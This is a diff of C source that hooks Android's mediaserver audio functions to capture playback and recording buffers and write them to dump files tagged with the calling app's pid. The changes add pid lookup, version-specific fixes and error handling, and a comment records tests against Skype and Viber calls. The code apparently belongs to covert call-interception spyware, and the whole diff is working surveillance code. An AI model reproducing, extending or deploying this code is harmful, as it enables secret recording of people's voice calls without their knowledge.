@@ -12,6 +12,15 @@
 #include <string.h>
 #include <unistd.h>
 
+/*
+ * 20/08/2014
+ * Testato con skype/viber su 4.1 OK
+ * Testato con skype su 4.0 OK
+ * 21/08/2014
+ * Testato con skype su 4.2.2 failure
+ *  Non viene recuperato il pid corretto e quindi la newTrack non crea la traccia di record
+ */
+
 #ifdef DEBUG
 extern char tag[];
 #endif
@@ -160,9 +169,9 @@ int get_command_id(int pid) {
 	}
 #if defined DEBUG_HOOKFNC
 	if(last_found<POS_MAX && last_found>=0){
-		log("[%d]%d=%s\n",last_found,pid,pid_name[last_found]);
+	//	log("[%d]%d=%s\n",last_found,pid,pid_name[last_found]);
 	}else{
-		log("[%d]%d=%s\n",last_found,pid,"?unknown?");
+	//	log("[%d]%d=%s\n",last_found,pid,"?unknown?");
 	}
 #endif
 	return last_pid_lookup_res[POS_RET];
@@ -266,29 +275,30 @@ void* recordTrackStop_h(void* a, void* b, void* c, void* d, void* e, void* f, vo
 
     /* rename file to .tmp and free the cblk structure  */
 #ifdef DEBUG_HOOKFNC
-    log("Stop: should take a dump: %s\n", cblk_tmp->filename);
+    log("Stop: should take a dump: %s\n", (cblk_tmp->filename!=NULL)?cblk_tmp->filename:"none");
 #endif
 
-    /* rename file *.bin to *.tmp */
-    filename = strdup(cblk_tmp->filename); // check return value
-    *(filename+strlen(filename)-1) = 'p';
-    *(filename+strlen(filename)-2) = 'm';
-    *(filename+strlen(filename)-3) = 't';
+    if(cblk_tmp->filename!=NULL){
+      /* rename file *.bin to *.tmp */
+      filename = strdup(cblk_tmp->filename); // check return value
+      *(filename+strlen(filename)-1) = 'p';
+      *(filename+strlen(filename)-2) = 'm';
+      *(filename+strlen(filename)-3) = 't';
 
-    res = rename(cblk_tmp->filename, filename);
+      res = rename(cblk_tmp->filename, filename);
 
 #ifdef DEBUG_HOOKFNC
-//    log("fname %s\n", filename);
-//    log("rename %d\n", res );
+      //    log("fname %s\n", filename);
+      //    log("rename %d\n", res );
 #endif
 
 
-    // 12/10
-    if( filename != NULL) {
-      free(filename);
-      filename = NULL;
+      // 12/10
+      if( filename != NULL) {
+        free(filename);
+        filename = NULL;
+      }
     }
-
     close(cblk_tmp->fd);
 
     /* free some stuff */
@@ -363,7 +373,16 @@ void*  newTrack_h(void* a, void* b, void* c, void* d, void* e, void* f, void* g,
   result = h_ptr( a,  b,  c,  d,  e,  f,  g,  h,  i,  j,  k,  l,  m,  n,  o,  p,  q,  r,  s,  t,  u,  w);
   helper_postcall(&newTrack_helper);
 
+
+
   cblk = *(unsigned long*) (a + 0x1c);
+
+  /* rettifica il vero pid si trova in : questo per il >4.3 , ma se cosi fosse allora tutti i calcoli su b sono errati?? per il 4.3??
+   * (gdb) p/x (int)&(('android::AudioFlinger::Client' *)0)->mPid ovver b->mPid
+   * $7 = 0x10
+   *
+   */
+
   unsigned long mClient;
   mClient = *(unsigned long*) (a + mClient_thisP_offset);
   pid = *(int*) (mClient + mPid_mClient_offset );
@@ -417,82 +436,84 @@ void*  newTrack_h(void* a, void* b, void* c, void* d, void* e, void* f, void* g,
   // the injection took place after the track
   // was created
   //log("start hash find\n");
-  HASH_FIND_INT( cblkTracks, &cblk, cblk_tmp);
-
-  if( cblk_tmp == NULL ) {
-
-    cblk_tmp =  malloc( sizeof(struct cblk_t) );
-
-    cblk_tmp->cblk_index = cblk;
-    cblk_tmp->streamType = streamType;
-    cblk_tmp->lastStatus = STATUS_NEW;
-    cblk_tmp->pid=pid;
-    snprintf(randString, 11, "%lu", mrand48());
-    snprintf(timestamp,  11, "%d", time(NULL));
-    snprintf(pidC,  11, "%d", pid);
-    cblk_tmp->trackId = strdup(randString);
-
-#ifdef DEBUG_HOOKFNC
-//    log("trackId: %s\n", cblk_tmp->trackId);
-#endif
-
-    // Qi-<timestamp>-<id univoco per chiamata>-<canale>.[tmp|boh]
-    // length:  2-strlen(timestamp)-strlen(randString)-1.3.1 + 3 chars for '-'
-    // filenameLength including null
 
 
-    if( cblk_tmp->streamType == 0 && cblk_tmp->pid>PRG_MEDIASERVER_ID ) {
-      filenameLength = strlen(dumpPath) + 1 + 2 + strlen(timestamp) + strlen(randString) + 1 + 4 + 1 + 3+1+strlen(pidC);
-
-      cblk_tmp->filename = malloc( sizeof(char) *  filenameLength  );
-      snprintf(cblk_tmp->filename, filenameLength, "%s/Qi-%s-%s-%s-r.bin", dumpPath, timestamp, randString,pidC );
-
-
-
-
-      cblk_tmp->fd = open(cblk_tmp->filename, O_RDWR | O_CREAT , S_IRUSR | S_IRGRP | S_IROTH);
-#ifdef DEBUG_HOOKFNC
-      log("filename: %s open %s ", cblk_tmp->filename,(cblk_tmp->fd>1)?"OK":"FAILED");
-#endif
-    }else{
-#ifdef DEBUG_HOOKFNC
-    	if(cblk_tmp->pid==PRG_MEDIASERVER_ID)
-    	log("skipping trackId: %s owned by mediaserver ", cblk_tmp->trackId);
-#endif
-    }
-
-    cblk_tmp->startOfCircularBuffer = *(unsigned int*) (cblk + 0x18);
-    cblk_tmp->frameCount = *(unsigned int*) (cblk + 0x1c);
-
-    cblk_tmp->lastBufferRaw  = bufferRaw;
-    cblk_tmp->lastFrameCount = framesCount;
-    cblk_tmp->lastFrameSize  = frameSize;
-
-
-    cblk_tmp->sampleRate = sampleRate;
-
-    HASH_ADD_INT(cblkTracks, cblk_index, cblk_tmp); // new track
-    cblk_tmp = NULL;
-
+  /* TODO evitare il tracking di tutta la traccia
+   * quindi sia nella tabella di hash */
+  if( android_version_ID >= ANDROID_V_4_3 || pid>PRG_MEDIASERVER_ID ) {
     HASH_FIND_INT( cblkTracks, &cblk, cblk_tmp);
 
     if( cblk_tmp == NULL ) {
+
+      cblk_tmp =  malloc( sizeof(struct cblk_t) );
+
+      cblk_tmp->cblk_index = cblk;
+      cblk_tmp->streamType = streamType;
+      cblk_tmp->lastStatus = STATUS_NEW;
+      cblk_tmp->pid=pid;
+      snprintf(randString, 11, "%lu", mrand48());
+      snprintf(timestamp,  11, "%d", time(NULL));
+      snprintf(pidC,  11, "%d", pid);
+      cblk_tmp->trackId = strdup(randString);
+
 #ifdef DEBUG_HOOKFNC
-      log("uthash issue\n");
+      //    log("trackId: %s\n", cblk_tmp->trackId);
 #endif
-      return result;
+
+      // Qi-<timestamp>-<id univoco per chiamata>-<canale>.[tmp|boh]
+      // length:  2-strlen(timestamp)-strlen(randString)-1.3.1 + 3 chars for '-'
+      // filenameLength including null
+
+      if( cblk_tmp->streamType == 0 ) {
+        filenameLength = strlen(dumpPath) + 1 + 2 + strlen(timestamp) + strlen(randString) + 1 + 4 + 1 + 3+1+strlen(pidC);
+
+        cblk_tmp->filename = malloc( sizeof(char) *  filenameLength  );
+        snprintf(cblk_tmp->filename, filenameLength, "%s/Qi-%s-%s-%s-r.bin", dumpPath, timestamp, randString,pidC );
+
+
+#ifdef DEBUG_HOOKFNC
+        if(cblk_tmp->pid==PRG_MEDIASERVER_ID)
+          log("trackId: %s owned by mediaserver ", cblk_tmp->trackId);
+#endif
+
+        cblk_tmp->fd = open(cblk_tmp->filename, O_RDWR | O_CREAT , S_IRUSR | S_IRGRP | S_IROTH);
+#ifdef DEBUG_HOOKFNC
+        log("filename: %s open %s ", cblk_tmp->filename,(cblk_tmp->fd>1)?"OK":"FAILED");
+#endif
+      }
+
+      cblk_tmp->startOfCircularBuffer = *(unsigned int*) (cblk + 0x18);
+      cblk_tmp->frameCount = *(unsigned int*) (cblk + 0x1c);
+
+      cblk_tmp->lastBufferRaw  = bufferRaw;
+      cblk_tmp->lastFrameCount = framesCount;
+      cblk_tmp->lastFrameSize  = frameSize;
+
+
+      cblk_tmp->sampleRate = sampleRate;
+
+      HASH_ADD_INT(cblkTracks, cblk_index, cblk_tmp); // new track
+      cblk_tmp = NULL;
+
+      HASH_FIND_INT( cblkTracks, &cblk, cblk_tmp);
+
+      if( cblk_tmp == NULL ) {
+#ifdef DEBUG_HOOKFNC
+        log("uthash issue\n");
+#endif
+        return result;
+      }
+#ifdef DEBUG_HOOKFNC
+      //log("\tnew Track added cblk\n");
+#endif
+
     }
 #ifdef DEBUG_HOOKFNC
-    //log("\tnew Track added cblk\n");
+    else {
+      //    log("cblk not found %x\n", cblk);
+    }
 #endif
-
   }
-#ifdef DEBUG_HOOKFNC
-  else {
-//    log("cblk not found %x\n", cblk);
-  }
-#endif
-
 #ifdef DEBUG_HOOKFNC
 //  log("\t\t\t----------- exit new track %p %p ------------------\n", result, a)
 #endif
@@ -535,7 +556,6 @@ void* playbackTrackStart_h(void* a, void* b, void* c, void* d, void* e, void* f,
 
     /* if status is STATUS_STOP, create the fields freed by stop event */
     if( cblk_tmp->lastStatus == STATUS_STOP ) {
-
       /* use old trackId and filename */
 
       // a] generate trackId
@@ -619,7 +639,6 @@ void* playbackTrackStop_h(void* a, void* b, void* c, void* d, void* e, void* f, 
   HASH_FIND_INT( cblkTracks, &cblk, cblk_tmp);
 
   if( cblk_tmp != NULL && cblk_tmp->streamType == STATUS_NEW ) {
-
 
     /* write fake final header */
     now = time(NULL);
@@ -706,7 +725,10 @@ void* playbackTrackPause_h(void* a, void* b, void* c, void* d, void* e, void* f,
   void* result;
   int res;
   unsigned long cblk;
-
+  struct cblk_t *cblk_tmp= NULL;
+  char *filename;
+  unsigned int uintTmp;
+  time_t now;
 #ifdef DEBUG_HOOKFNC
  // log("\t\t\t------- enter playbackTrackPause -------------\n");
 #endif
@@ -721,7 +743,62 @@ void* playbackTrackPause_h(void* a, void* b, void* c, void* d, void* e, void* f,
   helper_precall(&playbackTrackStart_helper);
   result = h_ptr( a,  b,  c,  d,  e,  f,  g,  h,  i,  j,  k,  l,  m,  n,  o,  p,  q,  r,  s,  t,  u,  w);
   helper_postcall(&playbackTrackStart_helper);
+  /* questo if viene fatto nel caso in cui la traccia venga messa in pausa per tutta la chiamata
+  ,per evitare che nella chiamata successiva venga riaperta e chiusa , la chiudiamo immediatamente
+  if(android_version_ID < ANDROID_V_4_3){
+    HASH_FIND_INT( cblkTracks, &cblk, cblk_tmp);
 
+    if( cblk_tmp != NULL && cblk_tmp->pid==PRG_MEDIASERVER_ID && cblk_tmp->streamType == 0) {
+
+      // write fake final header 
+       now = time(NULL);
+       write(cblk_tmp->fd, &now, 4); // 1] epoch start
+
+       uintTmp = 0xf00df00d;
+       write(cblk_tmp->fd, &uintTmp, 4); // 3] streamType
+
+       uintTmp = cblk_tmp->sampleRate;
+       write(cblk_tmp->fd, &uintTmp, 4); // 4] sampleRate
+
+       uintTmp = 0;
+       write(cblk_tmp->fd, &uintTmp, 4); // 5] size of block - 0 for last block
+
+
+       // rename file to .tmp and free the cblk structure
+
+
+       // rename file *.bin to *.tmp
+       filename = strdup(cblk_tmp->filename); // check return value
+       *(filename+strlen(filename)-1) = 'p';
+       *(filename+strlen(filename)-2) = 'm';
+       *(filename+strlen(filename)-3) = 't';
+
+   #ifdef DEBUG_HOOKFNC
+       log("fname %s FINALIZED\n", filename);
+       //log("rename %d\n", rename(cblk_tmp->filename, filename) );
+   #endif
+
+       rename(cblk_tmp->filename, filename);
+
+       if( filename != NULL)
+         free(filename);
+
+
+       close(cblk_tmp->fd);
+
+
+
+       if( cblk_tmp->filename != NULL ) {
+         free(cblk_tmp->filename);
+         cblk_tmp->filename = NULL;
+       }
+       cblk_tmp->lastStatus = STATUS_STOP;
+       HASH_DEL(cblkTracks, cblk_tmp);
+       free(cblk_tmp);
+
+    }
+  }
+  */
 #ifdef DEBUG_HOOKFNC
 //  log("\t\t\t\tresult: %d\n", (int) result);
 //  log("\t\t\t------- exit playbackTrackPause -------------\n");
@@ -847,7 +924,7 @@ void* playbackTrack_getNextBuffer3_h(void* a, void* b, void* c, void* d, void* e
 
   if( cblk_tmp != NULL ) {
 
-    if( result == 0 && framesCount != 0 && cblk_tmp->streamType == 0 && cblk_tmp->pid>1) {
+    if( result == 0 && framesCount != 0 && cblk_tmp->streamType == 0 ) {
       /*
        off_t lseek(int fd, off_t offset, int whence);
 DESCRIPTION
@@ -904,6 +981,14 @@ DESCRIPTION
 	written = write(cblk_tmp->fd, &cblk_tmp->streamType , 4); // 3] streamType
 	written = write(cblk_tmp->fd, &cblk_tmp->sampleRate , 4); // 4] sampleRate
 	written = write(cblk_tmp->fd, &res , 4); // 5] res
+	if(res!=(framesCount * frameSize)){
+#ifdef DEBUG_HOOKFNC
+    log("write less then expexted %d write %d \n", (framesCount * frameSize),res);
+    //log("rename %d\n", rename(cblk_tmp->filename, filename) );
+#endif
+    if(frameSize)
+      framesCount = res/frameSize;
+	}
 
 #ifdef DEBUG_HOOKFNC
 //	log("\t\t\theader fixed %x -> %x:%x:%x:%x\n", cblk_tmp->cblk_index, now, cblk_tmp->streamType, cblk_tmp->sampleRate, res);
@@ -930,7 +1015,7 @@ DESCRIPTION
 	  *(filename+strlen(filename)-3) = 't';
 
 #ifdef DEBUG_HOOKFNC
-	  log("fname %s\n", filename);
+	  log("DUMPING fname %s\n", filename);
 	  //log("rename %d\n", rename(cblk_tmp->filename, filename) );
 #endif
 	  rename(cblk_tmp->filename, filename);
@@ -968,11 +1053,12 @@ DESCRIPTION
 
       }else {
       // otherwise remove the header, we don't need this block
+	lseek(cblk_tmp->fd, headerStart, SEEK_SET);
       #ifdef DEBUG_HOOKFNC
         log("skipping this buffer block cblk %p nothing has been written to fd %d framesCount=%d frameSize=%d \n",
         						  cblk,cblk_tmp->fd,framesCount,frameSize);
 #endif
-	lseek(cblk_tmp->fd, headerStart, SEEK_SET);
+
       }
 
     }else{
@@ -1096,7 +1182,24 @@ void* recordTrack_getNextBuffer3_h(void* a, void* b, void* c, void* d, void* e, 
 
   /* [1] first field (ptr) within AudioBufferProvider */
   bufferRaw = *(unsigned int*) (b);
-
+    unsigned long mClient;
+    mClient = *(unsigned long*) (a + mClient_thisP_offset);
+    int pid = *(int*) (mClient + mPid_mClient_offset );
+  #ifdef DEBUG_HOOKFNC
+//  log("\tnew track cblk: %p calling pid=%d trackId: %s\n", cblk,pid,cblk_tmp->trackId);
+  #endif
+    if(pid>0){
+    	int tmp=0;
+    	tmp=get_command_id(pid);
+#ifdef DEBUG_HOOKFNC
+    	if(tmp<=0){
+    		log("pid %d not found\n",pid);
+    	}
+#endif
+    	pid=tmp;
+     }else{
+   	  pid=0;
+     }
 
   // add the cblk to the tracks list, if
   // we don't find it, it might be because
@@ -1132,24 +1235,7 @@ void* recordTrack_getNextBuffer3_h(void* a, void* b, void* c, void* d, void* e, 
    // log("trackId: %s\n", cblk_tmp->trackId);
 #endif
 
-    unsigned long mClient;
-    mClient = *(unsigned long*) (a + mClient_thisP_offset);
-    int pid = *(int*) (mClient + mPid_mClient_offset );
-  #ifdef DEBUG_HOOKFNC
-//  log("\tnew track cblk: %p calling pid=%d trackId: %s\n", cblk,pid,cblk_tmp->trackId);
-  #endif
-    if(pid>0){
-    	int tmp=0;
-    	tmp=get_command_id(pid);
-#ifdef DEBUG_HOOKFNC
-    	if(tmp<=0){
-    		log("pid %d not found\n",pid);
-    	}
-#endif
-    	pid=tmp;
-     }else{
-   	  pid=0;
-     }
+
     //         Qi-<timestamp>-<id univoco per chiamata>-<canale>-<pid>.[tmp|boh]
     // length:  2-strlen(timestamp)-strlen(randString)-1.3.1 + 3 chars for '-'
     // filenameLength including null
@@ -1259,7 +1345,14 @@ void* recordTrack_getNextBuffer3_h(void* a, void* b, void* c, void* d, void* e, 
 	written = write(cblk_tmp->fd, &cblk_tmp->sampleRate , 4); // 3] sampleRate
 	written = write(cblk_tmp->fd, &res , 4); // 4] res
 
-
+  if(res!=(framesCount * frameSize)){
+#ifdef DEBUG_HOOKFNC
+    log("write less then expexted %d write %d \n", (framesCount * frameSize),res);
+    //log("rename %d\n", rename(cblk_tmp->filename, filename) );
+#endif
+    if(frameSize)
+      framesCount = res/frameSize;
+  }
 #ifdef DEBUG_HOOKFNC
 //	log("\t\t\theader fixed %x -> %x:%x:%x:%x\n", cblk_tmp->cblk_index, now, cblk_tmp->streamType, cblk_tmp->sampleRate, res);
 #endif
@@ -1303,6 +1396,7 @@ void* recordTrack_getNextBuffer3_h(void* a, void* b, void* c, void* d, void* e, 
 
 	  /* generate a new filename for the track */
 	  snprintf(timestamp,  11, "%d", time(NULL));
+	  cblk_tmp->pid=pid;
 	  snprintf(pidC,  11, "%d", cblk_tmp->pid);
 
 	  filenameLength = strlen(dumpPath) + 1 + 2 + strlen(timestamp) + strlen(cblk_tmp->trackId) + 1 + 4 + 1 + 3 + 1 + strlen(pidC);
